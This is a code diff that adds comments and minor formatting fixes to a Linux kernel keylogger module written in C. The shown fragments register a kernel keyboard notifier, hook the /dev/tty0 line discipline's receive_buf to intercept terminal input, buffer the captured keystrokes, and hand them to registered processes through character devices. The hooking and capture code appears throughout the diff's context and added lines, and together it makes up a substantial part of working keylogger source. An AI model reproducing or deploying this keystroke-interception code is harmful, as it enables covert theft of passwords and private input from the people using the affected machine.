@@ -91,14 +91,16 @@ ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_p
         return 0;
     }
 
+    // Translate pid from string to base 10 integer
     registered_pid = simple_strtol( pid_buffer, &endptr, 10 );
     if ( registered_pid == 0 && endptr == pid_buffer ) {
         print812( "Failed to parse pid" );
         return 0;
-    } 
+    }
 
     print812( "PROC SENT: %d", registered_pid );
 
+    // Search list of registered procs and unregister if pid has already been registered
     for( i=0; i<MAX_REGISTERED_PROCS; i++ ) {
         if(registered_pids[i] == registered_pid) {
             print812( "Unregistering process %s", pid_buffer );
@@ -107,6 +109,7 @@ ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_p
         }
     }
 
+    // If we didn't unregsiter, search for a free record and register the pid
     if(initial_registered_count == registered_proc_count) {
         if(registered_proc_count < MAX_REGISTERED_PROCS) {
             i=0;
@@ -137,6 +140,7 @@ ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
     struct logged_key *curr = NULL;
 
     if ( *f_pos == 0 ) {
+        // Write out entire key buffer and reset it
         for ( i = 0; i < num_keys_logged; i++ ) {
             curr = &key_buffer[i];
 
@@ -165,6 +169,7 @@ ssize_t tty_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
     struct logged_key *curr = NULL;
 
     if ( *f_pos == 0 ) {
+        // Write out entire TTY buffer and reset it
         for( i = 0; i < num_tty_keys_logged; i++ ) {
             curr = &ttykey_buffer[i];
 
@@ -186,6 +191,7 @@ ssize_t tty_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
     }
 }
 
+// Helper for opening the TTY device file
 struct file* file_open(const char* path, int flags, int rights) {
     struct file* filp = NULL;
     mm_segment_t oldfs;
@@ -234,6 +240,7 @@ static void SendKey( void ) {
     }
 }
 
+// Process keypress notification from TTY device
 void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
 {   
 	const char *key_name = NULL;
@@ -281,6 +288,7 @@ void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, 
     (*old_receive_buf)(tty, cp, fp, count);
 }
 
+// Process key press notification from kernel
 int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
     char *key_name = NULL;
@@ -293,6 +301,7 @@ int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_p
             return NOTIFY_OK;
         }
 
+        // Prepare the slot in the key buffer and increment buf position
         if ( param->down && registered_proc_count ) {
             if ( num_keys_logged < KEYLOG_BUF_SIZE ) {
                 key_name = cur_keymap[param->value];
@@ -317,7 +326,8 @@ int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_p
     return NOTIFY_OK;
 }
 
-static int interpret_meta_key( unsigned int keycode, unsigned int down  ) {
+// Interpret special keys for key presses
+static int interpret_meta_key( unsigned int keycode, unsigned int down ) {
     switch ( keycode ) {
     case 0x1C: // Enter key
         if ( down ) {
@@ -343,6 +353,7 @@ static int interpret_meta_key( unsigned int keycode, unsigned int down  ) {
     return 0;
 }
 
+// Interpret special keys for TTY devices
 static int interpret_tty_meta_key( const char* keycode ) {
     if( strcmp( keycode, "[Enter]" ) == 0 ) {
         SendKey();
@@ -413,12 +424,15 @@ static int keylogger_init( void ) {
         return err;
     }
     
+    // Initialize registered PIDs to -1
     for(i=0; i<MAX_REGISTERED_PROCS; i++) {
         registered_pids[i] = -1;
     }
-
-    register_keyboard_notifier(&keyboardNotifierBlock);
     
+    // Ask kernel for physical key press notifications
+    register_keyboard_notifier( &keyboardNotifierBlock );
+    
+    // Intercept TTY key presses with our own method
     file = file_open("/dev/tty0", O_RDONLY, 0);
     if(file != NULL)
     {
@@ -438,8 +452,10 @@ static int keylogger_init( void ) {
 static void keylogger_exit( void ) {
     print812( "Unregistering the module" );
 
+    // Unhook ourselves from physical keyboard notifications
     unregister_keyboard_notifier(&keyboardNotifierBlock);
 
+    // Restore the system TTY device implementation
     if(file != NULL)
     {
         filp_close(file, NULL);
@@ -450,6 +466,7 @@ static void keylogger_exit( void ) {
         tty->ldisc->ops->receive_buf = old_receive_buf;
     }
 
+    // Unhook character devices
     unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
     unregister_chrdev( TTYLOG_MAJOR, TTYLOG_NAME );
 
